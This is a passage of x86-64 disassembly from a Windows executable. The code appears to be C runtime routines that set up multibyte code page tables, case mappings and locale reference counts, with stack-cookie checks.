   140008f02:	33 c9                	xor    %ecx,%ecx
   140008f04:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140008f08:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140008f0c:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140008f10:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008f15:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140008f19:	e8 8e 2f 00 00       	call   0x14000beac
   140008f1e:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140008f23:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140008f28:	8b 43 04             	mov    0x4(%rbx),%eax
   140008f2b:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140008f31:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   140008f38:	33 c9                	xor    %ecx,%ecx
   140008f3a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140008f3e:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   140008f45:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140008f49:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008f4e:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140008f52:	e8 55 2f 00 00       	call   0x14000beac
   140008f57:	b8 01 00 00 00       	mov    $0x1,%eax
   140008f5c:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   140008f63:	f6 02 01             	testb  $0x1,(%rdx)
   140008f66:	74 0b                	je     0x140008f73
   140008f68:	80 4c 18 18 10       	orb    $0x10,0x18(%rax,%rbx,1)
   140008f6d:	8a 4c 05 6f          	mov    0x6f(%rbp,%rax,1),%cl
   140008f71:	eb 15                	jmp    0x140008f88
   140008f73:	f6 02 02             	testb  $0x2,(%rdx)
   140008f76:	74 0e                	je     0x140008f86
   140008f78:	80 4c 18 18 20       	orb    $0x20,0x18(%rax,%rbx,1)
   140008f7d:	8a 8c 05 6f 01 00 00 	mov    0x16f(%rbp,%rax,1),%cl
   140008f84:	eb 02                	jmp    0x140008f88
   140008f86:	32 c9                	xor    %cl,%cl
   140008f88:	88 8c 18 18 01 00 00 	mov    %cl,0x118(%rax,%rbx,1)
   140008f8f:	48 83 c2 02          	add    $0x2,%rdx
   140008f93:	48 ff c0             	inc    %rax
   140008f96:	48 83 ee 01          	sub    $0x1,%rsi
   140008f9a:	75 c7                	jne    0x140008f63
   140008f9c:	eb 43                	jmp    0x140008fe1
   140008f9e:	33 d2                	xor    %edx,%edx
   140008fa0:	be 00 01 00 00       	mov    $0x100,%esi
   140008fa5:	8d 4a 01             	lea    0x1(%rdx),%ecx
   140008fa8:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   140008fac:	41 8d 40 20          	lea    0x20(%r8),%eax
   140008fb0:	83 f8 19             	cmp    $0x19,%eax
   140008fb3:	77 0a                	ja     0x140008fbf
   140008fb5:	80 4c 0b 18 10       	orb    $0x10,0x18(%rbx,%rcx,1)
   140008fba:	8d 42 20             	lea    0x20(%rdx),%eax
   140008fbd:	eb 12                	jmp    0x140008fd1
   140008fbf:	41 83 f8 19          	cmp    $0x19,%r8d
   140008fc3:	77 0a                	ja     0x140008fcf
   140008fc5:	80 4c 0b 18 20       	orb    $0x20,0x18(%rbx,%rcx,1)
   140008fca:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140008fcd:	eb 02                	jmp    0x140008fd1
   140008fcf:	32 c0                	xor    %al,%al
   140008fd1:	88 84 0b 18 01 00 00 	mov    %al,0x118(%rbx,%rcx,1)
   140008fd8:	ff c2                	inc    %edx
   140008fda:	48 ff c1             	inc    %rcx
   140008fdd:	3b d6                	cmp    %esi,%edx
   140008fdf:	72 c7                	jb     0x140008fa8
   140008fe1:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   140008fe8:	48 33 cc             	xor    %rsp,%rcx
   140008feb:	e8 40 a1 ff ff       	call   0x140003130
   140008ff0:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   140008ff7:	00 
   140008ff8:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140008ffc:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140009000:	49 8b e3             	mov    %r11,%rsp
   140009003:	5d                   	pop    %rbp
   140009004:	c3                   	ret
   140009005:	cc                   	int3
   140009006:	cc                   	int3
   140009007:	cc                   	int3
   140009008:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000900d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140009012:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140009017:	55                   	push   %rbp
   140009018:	56                   	push   %rsi
   140009019:	57                   	push   %rdi
   14000901a:	48 8b ec             	mov    %rsp,%rbp
   14000901d:	48 83 ec 40          	sub    $0x40,%rsp
   140009021:	40 8a f2             	mov    %dl,%sil
   140009024:	8b d9                	mov    %ecx,%ebx
   140009026:	49 8b d1             	mov    %r9,%rdx
   140009029:	49 8b c8             	mov    %r8,%rcx
   14000902c:	e8 97 01 00 00       	call   0x1400091c8
   140009031:	8b cb                	mov    %ebx,%ecx
   140009033:	e8 dc fc ff ff       	call   0x140008d14
   140009038:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000903c:	8b f8                	mov    %eax,%edi
   14000903e:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   140009045:	41 3b 40 04          	cmp    0x4(%r8),%eax
   140009049:	75 07                	jne    0x140009052
   14000904b:	33 c0                	xor    %eax,%eax
   14000904d:	e9 b8 00 00 00       	jmp    0x14000910a
   140009052:	b9 28 02 00 00       	mov    $0x228,%ecx
   140009057:	e8 ec ed ff ff       	call   0x140007e48
   14000905c:	48 8b d8             	mov    %rax,%rbx
   14000905f:	48 85 c0             	test   %rax,%rax
   140009062:	0f 84 95 00 00 00    	je     0x1400090fd
   140009068:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000906c:	ba 04 00 00 00       	mov    $0x4,%edx
   140009071:	48 8b cb             	mov    %rbx,%rcx
   140009074:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   14000907b:	44 8d 42 7c          	lea    0x7c(%rdx),%r8d
   14000907f:	0f 10 00             	movups (%rax),%xmm0
   140009082:	0f 11 01             	movups %xmm0,(%rcx)
   140009085:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140009089:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   14000908d:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140009091:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140009095:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140009099:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   14000909d:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400090a1:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1400090a5:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400090a9:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400090ad:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400090b1:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400090b5:	49 03 c8             	add    %r8,%rcx
   1400090b8:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400090bc:	49 03 c0             	add    %r8,%rax
   1400090bf:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400090c3:	48 83 ea 01          	sub    $0x1,%rdx
   1400090c7:	75 b6                	jne    0x14000907f
   1400090c9:	0f 10 00             	movups (%rax),%xmm0
   1400090cc:	0f 11 01             	movups %xmm0,(%rcx)
   1400090cf:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400090d3:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400090d7:	48 8b 40 20          	mov    0x20(%rax),%rax
   1400090db:	48 89 41 20          	mov    %rax,0x20(%rcx)
   1400090df:	8b cf                	mov    %edi,%ecx
   1400090e1:	21 13                	and    %edx,(%rbx)
   1400090e3:	48 8b d3             	mov    %rbx,%rdx
   1400090e6:	e8 11 02 00 00       	call   0x1400092fc
   1400090eb:	8b f8                	mov    %eax,%edi
   1400090ed:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400090f0:	75 25                	jne    0x140009117
   1400090f2:	e8 49 e6 ff ff       	call   0x140007740
   1400090f7:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400090fd:	83 cf ff             	or     $0xffffffff,%edi
   140009100:	48 8b cb             	mov    %rbx,%rcx
   140009103:	e8 18 ee ff ff       	call   0x140007f20
   140009108:	8b c7                	mov    %edi,%eax
   14000910a:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000910f:	48 83 c4 40          	add    $0x40,%rsp
   140009113:	5f                   	pop    %rdi
   140009114:	5e                   	pop    %rsi
   140009115:	5d                   	pop    %rbp
   140009116:	c3                   	ret
   140009117:	40 84 f6             	test   %sil,%sil
   14000911a:	75 05                	jne    0x140009121
   14000911c:	e8 c3 d4 ff ff       	call   0x1400065e4
   140009121:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140009125:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   14000912c:	83 c8 ff             	or     $0xffffffff,%eax
   14000912f:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140009133:	83 f8 01             	cmp    $0x1,%eax
   140009136:	75 1c                	jne    0x140009154
   140009138:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000913c:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140009143:	48 8d 05 86 10 01 00 	lea    0x11086(%rip),%rax        # 0x14001a1d0
   14000914a:	48 3b c8             	cmp    %rax,%rcx
   14000914d:	74 05                	je     0x140009154
   14000914f:	e8 cc ed ff ff       	call   0x140007f20
   140009154:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   14000915a:	48 8b cb             	mov    %rbx,%rcx
   14000915d:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140009161:	33 db                	xor    %ebx,%ebx
   140009163:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   14000916a:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000916e:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   140009174:	85 0d 36 16 01 00    	test   %ecx,0x11636(%rip)        # 0x14001a7b0
   14000917a:	75 84                	jne    0x140009100
   14000917c:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140009180:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009184:	4c 8d 4d e4          	lea    -0x1c(%rbp),%r9
   140009188:	48 8d 45 38          	lea    0x38(%rbp),%rax
   14000918c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009190:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140009194:	8d 43 05             	lea    0x5(%rbx),%eax
   140009197:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   14000919b:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000919e:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400091a2:	89 45 e8             	mov    %eax,-0x18(%rbp)
   1400091a5:	e8 ae f9 ff ff       	call   0x140008b58
   1400091aa:	40 84 f6             	test   %sil,%sil
   1400091ad:	0f 84 4d ff ff ff    	je     0x140009100
   1400091b3:	48 8b 45 38          	mov    0x38(%rbp),%rax
   1400091b7:	48 8b 08             	mov    (%rax),%rcx
   1400091ba:	48 89 0d ff 0f 01 00 	mov    %rcx,0x10fff(%rip)        # 0x14001a1c0
   1400091c1:	e9 3a ff ff ff       	jmp    0x140009100
   1400091c6:	cc                   	int3
   1400091c7:	cc                   	int3
   1400091c8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400091cd:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400091d2:	57                   	push   %rdi
   1400091d3:	48 83 ec 20          	sub    $0x20,%rsp
   1400091d7:	48 8b f2             	mov    %rdx,%rsi
   1400091da:	48 8b f9             	mov    %rcx,%rdi
   1400091dd:	8b 05 cd 15 01 00    	mov    0x115cd(%rip),%eax        # 0x14001a7b0
   1400091e3:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   1400091e9:	74 13                	je     0x1400091fe
   1400091eb:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   1400091f2:	00 
   1400091f3:	74 09                	je     0x1400091fe
   1400091f5:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   1400091fc:	eb 64                	jmp    0x140009262
   1400091fe:	b9 05 00 00 00       	mov    $0x5,%ecx
   140009203:	e8 d0 eb ff ff       	call   0x140007dd8
   140009208:	90                   	nop
   140009209:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   140009210:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140009215:	48 3b 1e             	cmp    (%rsi),%rbx
   140009218:	74 3e                	je     0x140009258
   14000921a:	48 85 db             	test   %rbx,%rbx
   14000921d:	74 22                	je     0x140009241
   14000921f:	83 c8 ff             	or     $0xffffffff,%eax
   140009222:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   140009226:	83 f8 01             	cmp    $0x1,%eax
   140009229:	75 16                	jne    0x140009241
   14000922b:	48 8d 05 9e 0f 01 00 	lea    0x10f9e(%rip),%rax        # 0x14001a1d0
   140009232:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009237:	48 3b c8             	cmp    %rax,%rcx
   14000923a:	74 05                	je     0x140009241
   14000923c:	e8 df ec ff ff       	call   0x140007f20
   140009241:	48 8b 06             	mov    (%rsi),%rax
   140009244:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   14000924b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140009250:	f0 ff 00             	lock incl (%rax)
   140009253:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009258:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000925d:	e8 ca eb ff ff       	call   0x140007e2c
   140009262:	48 85 db             	test   %rbx,%rbx
   140009265:	74 13                	je     0x14000927a
   140009267:	48 8b c3             	mov    %rbx,%rax
   14000926a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000926f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009274:	48 83 c4 20          	add    $0x20,%rsp
   140009278:	5f                   	pop    %rdi
   140009279:	c3                   	ret
   14000927a:	e8 51 da ff ff       	call   0x140006cd0
   14000927f:	90                   	nop
   140009280:	48 83 ec 28          	sub    $0x28,%rsp
   140009284:	80 3d 09 25 01 00 00 	cmpb   $0x0,0x12509(%rip)        # 0x14001b794
   14000928b:	75 4c                	jne    0x1400092d9
   14000928d:	48 8d 0d 7c 12 01 00 	lea    0x1127c(%rip),%rcx        # 0x14001a510
   140009294:	48 89 0d e5 24 01 00 	mov    %rcx,0x124e5(%rip)        # 0x14001b780
   14000929b:	48 8d 05 2e 0f 01 00 	lea    0x10f2e(%rip),%rax        # 0x14001a1d0
   1400092a2:	48 8d 0d 57 11 01 00 	lea    0x11157(%rip),%rcx        # 0x14001a400
   1400092a9:	48 89 05 d8 24 01 00 	mov    %rax,0x124d8(%rip)        # 0x14001b788
   1400092b0:	48 89 0d c1 24 01 00 	mov    %rcx,0x124c1(%rip)        # 0x14001b778
   1400092b7:	e8 7c df ff ff       	call   0x140007238
   1400092bc:	4c 8d 0d c5 24 01 00 	lea    0x124c5(%rip),%r9        # 0x14001b788
   1400092c3:	4c 8b c0             	mov    %rax,%r8
   1400092c6:	b2 01                	mov    $0x1,%dl
   1400092c8:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   1400092cd:	e8 36 fd ff ff       	call   0x140009008
   1400092d2:	c6 05 bb 24 01 00 01 	movb   $0x1,0x124bb(%rip)        # 0x14001b794
   1400092d9:	b0 01                	mov    $0x1,%al
   1400092db:	48 83 c4 28          	add    $0x28,%rsp
   1400092df:	c3                   	ret
   1400092e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400092e4:	e8 7b de ff ff       	call   0x140007164
   1400092e9:	48 8b c8             	mov    %rax,%rcx
   1400092ec:	48 8d 15 95 24 01 00 	lea    0x12495(%rip),%rdx        # 0x14001b788
   1400092f3:	48 83 c4 28          	add    $0x28,%rsp
   1400092f7:	e9 cc fe ff ff       	jmp    0x1400091c8
   1400092fc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140009301:	55                   	push   %rbp
   140009302:	56                   	push   %rsi
   140009303:	57                   	push   %rdi
   140009304:	41 54                	push   %r12
   140009306:	41 55                	push   %r13
   140009308:	41 56                	push   %r14
   14000930a:	41 57                	push   %r15
   14000930c:	48 83 ec 40          	sub    $0x40,%rsp
   140009310:	48 8b 05 e9 0c 01 00 	mov    0x10ce9(%rip),%rax        # 0x14001a000
   140009317:	48 33 c4             	xor    %rsp,%rax
   14000931a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000931f:	48 8b f2             	mov    %rdx,%rsi
   140009322:	e8 ed f9 ff ff       	call   0x140008d14
   140009327:	33 db                	xor    %ebx,%ebx
   140009329:	8b f8                	mov    %eax,%edi
   14000932b:	85 c0                	test   %eax,%eax
   14000932d:	0f 84 53 02 00 00    	je     0x140009586
   140009333:	4c 8d 2d e6 12 01 00 	lea    0x112e6(%rip),%r13        # 0x14001a620
   14000933a:	44 8b f3             	mov    %ebx,%r14d
   14000933d:	49 8b c5             	mov    %r13,%rax
   140009340:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140009343:	39 38                	cmp    %edi,(%rax)
   140009345:	0f 84 4e 01 00 00    	je     0x140009499
   14000934b:	44 03 f5             	add    %ebp,%r14d
   14000934e:	48 83 c0 30          	add    $0x30,%rax
   140009352:	41 83 fe 05          	cmp    $0x5,%r14d
   140009356:	72 eb                	jb     0x140009343
   140009358:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   14000935e:	0f 84 2d 01 00 00    	je     0x140009491
   140009364:	0f b7 cf             	movzwl %di,%ecx
   140009367:	ff 15 23 60 00 00    	call   *0x6023(%rip)        # 0x14000f390
   14000936d:	85 c0                	test   %eax,%eax
   14000936f:	0f 84 1c 01 00 00    	je     0x140009491
   140009375:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   14000937a:	3b f8                	cmp    %eax,%edi
   14000937c:	75 2e                	jne    0x1400093ac
   14000937e:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140009382:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140009389:	89 5e 18             	mov    %ebx,0x18(%rsi)
   14000938c:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   140009390:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   140009394:	0f b7 c3             	movzwl %bx,%eax
   140009397:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000939c:	66 f3 ab             	rep stos %ax,(%rdi)
   14000939f:	48 8b ce             	mov    %rsi,%rcx
   1400093a2:	e8 7d fa ff ff       	call   0x140008e24
   1400093a7:	e9 e2 01 00 00       	jmp    0x14000958e
   1400093ac:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400093b1:	8b cf                	mov    %edi,%ecx
   1400093b3:	ff 15 ef 5f 00 00    	call   *0x5fef(%rip)        # 0x14000f3a8
   1400093b9:	85 c0                	test   %eax,%eax
   1400093bb:	0f 84 c4 00 00 00    	je     0x140009485
   1400093c1:	33 d2                	xor    %edx,%edx
   1400093c3:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1400093c7:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400093cd:	e8 fe b2 ff ff       	call   0x1400046d0
   1400093d2:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   1400093d7:	89 7e 04             	mov    %edi,0x4(%rsi)
   1400093da:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1400093e1:	0f 85 94 00 00 00    	jne    0x14000947b
   1400093e7:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   1400093ec:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   1400093f0:	74 2c                	je     0x14000941e
   1400093f2:	38 59 01             	cmp    %bl,0x1(%rcx)
   1400093f5:	74 27                	je     0x14000941e
   1400093f7:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   1400093fb:	0f b6 11             	movzbl (%rcx),%edx
   1400093fe:	3b d0                	cmp    %eax,%edx
   140009400:	77 14                	ja     0x140009416
   140009402:	2b c2                	sub    %edx,%eax
   140009404:	8d 7a 01             	lea    0x1(%rdx),%edi
   140009407:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   14000940a:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   14000940f:	03 fd                	add    %ebp,%edi
   140009411:	48 2b d5             	sub    %rbp,%rdx
   140009414:	75 f4                	jne    0x14000940a
   140009416:	48 83 c1 02          	add    $0x2,%rcx
   14000941a:	38 19                	cmp    %bl,(%rcx)
   14000941c:	75 d4                	jne    0x1400093f2
   14000941e:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   140009422:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   140009427:	80 08 08             	orb    $0x8,(%rax)
   14000942a:	48 03 c5             	add    %rbp,%rax
   14000942d:	48 2b cd             	sub    %rbp,%rcx
   140009430:	75 f5                	jne    0x140009427
   140009432:	8b 4e 04             	mov    0x4(%rsi),%ecx
   140009435:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   14000943b:	74 2e                	je     0x14000946b
   14000943d:	83 e9 04             	sub    $0x4,%ecx
   140009440:	74 20                	je     0x140009462
   140009442:	83 e9 0d             	sub    $0xd,%ecx
   140009445:	74 12                	je     0x140009459
   140009447:	3b cd                	cmp    %ebp,%ecx
   140009449:	74 05                	je     0x140009450
   14000944b:	48 8b c3             	mov    %rbx,%rax
   14000944e:	eb 22                	jmp    0x140009472
   140009450:	48 8b 05 61 86 00 00 	mov    0x8661(%rip),%rax        # 0x140011ab8
   140009457:	eb 19                	jmp    0x140009472
   140009459:	48 8b 05 50 86 00 00 	mov    0x8650(%rip),%rax        # 0x140011ab0
   140009460:	eb 10                	jmp    0x140009472
   140009462:	48 8b 05 3f 86 00 00 	mov    0x863f(%rip),%rax        # 0x140011aa8
   140009469:	eb 07                	jmp    0x140009472
   14000946b:	48 8b 05 2e 86 00 00 	mov    0x862e(%rip),%rax        # 0x140011aa0
   140009472:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   140009479:	eb 02                	jmp    0x14000947d
   14000947b:	8b eb                	mov    %ebx,%ebp
   14000947d:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140009480:	e9 0b ff ff ff       	jmp    0x140009390
   140009485:	39 1d 05 23 01 00    	cmp    %ebx,0x12305(%rip)        # 0x14001b790
   14000948b:	0f 85 f5 00 00 00    	jne    0x140009586
   140009491:	83 c8 ff             	or     $0xffffffff,%eax
   140009494:	e9 f7 00 00 00       	jmp    0x140009590
   140009499:	33 d2                	xor    %edx,%edx
   14000949b:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   14000949f:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1400094a5:	e8 26 b2 ff ff       	call   0x1400046d0
   1400094aa:	41 8b c6             	mov    %r14d,%eax
   1400094ad:	4d 8d 4d 10          	lea    0x10(%r13),%r9
   1400094b1:	4c 8d 3d 58 11 01 00 	lea    0x11158(%rip),%r15        # 0x14001a610
   1400094b8:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1400094be:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   1400094c2:	49 c1 e3 04          	shl    $0x4,%r11
   1400094c6:	4d 03 cb             	add    %r11,%r9
   1400094c9:	49 8b d1             	mov    %r9,%rdx
   1400094cc:	41 38 19             	cmp    %bl,(%r9)
   1400094cf:	74 3e                	je     0x14000950f
   1400094d1:	38 5a 01             	cmp    %bl,0x1(%rdx)
   1400094d4:	74 39                	je     0x14000950f
   1400094d6:	44 0f b6 02          	movzbl (%rdx),%r8d
   1400094da:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400094de:	44 3b c0             	cmp    %eax,%r8d
   1400094e1:	77 24                	ja     0x140009507
   1400094e3:	45 8d 50 01          	lea    0x1(%r8),%r10d
   1400094e7:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   1400094ee:	73 17                	jae    0x140009507
   1400094f0:	41 8a 07             	mov    (%r15),%al
   1400094f3:	44 03 c5             	add    %ebp,%r8d
   1400094f6:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   1400094fb:	44 03 d5             	add    %ebp,%r10d
   1400094fe:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140009502:	44 3b c0             	cmp    %eax,%r8d
   140009505:	76 e0                	jbe    0x1400094e7
   140009507:	48 83 c2 02          	add    $0x2,%rdx
   14000950b:	38 1a                	cmp    %bl,(%rdx)
   14000950d:	75 c2                	jne    0x1400094d1
   14000950f:	49 83 c1 08          	add    $0x8,%r9
   140009513:	4c 03 fd             	add    %rbp,%r15
   140009516:	4c 2b f5             	sub    %rbp,%r14
   140009519:	75 ae                	jne    0x1400094c9
   14000951b:	89 7e 04             	mov    %edi,0x4(%rsi)
   14000951e:	89 6e 08             	mov    %ebp,0x8(%rsi)
   140009521:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   140009527:	74 29                	je     0x140009552
   140009529:	83 ef 04             	sub    $0x4,%edi
   14000952c:	74 1b                	je     0x140009549
   14000952e:	83 ef 0d             	sub    $0xd,%edi
   140009531:	74 0d                	je     0x140009540
   140009533:	3b fd                	cmp    %ebp,%edi
   140009535:	75 22                	jne    0x140009559
   140009537:	48 8b 1d 7a 85 00 00 	mov    0x857a(%rip),%rbx        # 0x140011ab8
   14000953e:	eb 19                	jmp    0x140009559
   140009540:	48 8b 1d 69 85 00 00 	mov    0x8569(%rip),%rbx        # 0x140011ab0
   140009547:	eb 10                	jmp    0x140009559
   140009549:	48 8b 1d 58 85 00 00 	mov    0x8558(%rip),%rbx        # 0x140011aa8
   140009550:	eb 07                	jmp    0x140009559
   140009552:	48 8b 1d 47 85 00 00 	mov    0x8547(%rip),%rbx        # 0x140011aa0
   140009559:	4c 2b de             	sub    %rsi,%r11
   14000955c:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   140009563:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   140009567:	b9 06 00 00 00       	mov    $0x6,%ecx
   14000956c:	4b 8d 3c 2b          	lea    (%r11,%r13,1),%rdi
   140009570:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   140009575:	66 89 02             	mov    %ax,(%rdx)
   140009578:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   14000957c:	48 2b cd             	sub    %rbp,%rcx
   14000957f:	75 ef                	jne    0x140009570
   140009581:	e9 19 fe ff ff       	jmp    0x14000939f
   140009586:	48 8b ce             	mov    %rsi,%rcx
   140009589:	e8 06 f8 ff ff       	call   0x140008d94
   14000958e:	33 c0                	xor    %eax,%eax
   140009590:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140009595:	48 33 cc             	xor    %rsp,%rcx
   140009598:	e8 93 9b ff ff       	call   0x140003130
   14000959d:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400095a4:	00 
   1400095a5:	48 83 c4 40          	add    $0x40,%rsp
   1400095a9:	41 5f                	pop    %r15
   1400095ab:	41 5e                	pop    %r14
   1400095ad:	41 5d                	pop    %r13
   1400095af:	41 5c                	pop    %r12
   1400095b1:	5f                   	pop    %rdi
   1400095b2:	5e                   	pop    %rsi
   1400095b3:	5d                   	pop    %rbp
   1400095b4:	c3                   	ret
   1400095b5:	cc                   	int3
   1400095b6:	cc                   	int3
   1400095b7:	cc                   	int3
   1400095b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400095bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400095c2:	57                   	push   %rdi
   1400095c3:	48 83 ec 40          	sub    $0x40,%rsp
   1400095c7:	8b da                	mov    %edx,%ebx
   1400095c9:	41 8b f9             	mov    %r9d,%edi
   1400095cc:	48 8b d1             	mov    %rcx,%rdx
   1400095cf:	41 8b f0             	mov    %r8d,%esi
   1400095d2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400095d7:	e8 14 c2 ff ff       	call   0x1400057f0
   1400095dc:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400095e1:	0f b6 d3             	movzbl %bl,%edx
   1400095e4:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   1400095e9:	75 1a                	jne    0x140009605
   1400095eb:	85 f6                	test   %esi,%esi
   1400095ed:	74 10                	je     0x1400095ff
   1400095ef:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400095f4:	48 8b 08             	mov    (%rax),%rcx
   1400095f7:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   1400095fb:	23 c6                	and    %esi,%eax
   1400095fd:	eb 02                	jmp    0x140009601
   1400095ff:	33 c0                	xor    %eax,%eax
   140009601:	85 c0                	test   %eax,%eax
   140009603:	74 05                	je     0x14000960a
   140009605:	b8 01 00 00 00       	mov    $0x1,%eax
   14000960a:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000960f:	74 0c                	je     0x14000961d
   140009611:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009616:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000961d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009622:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
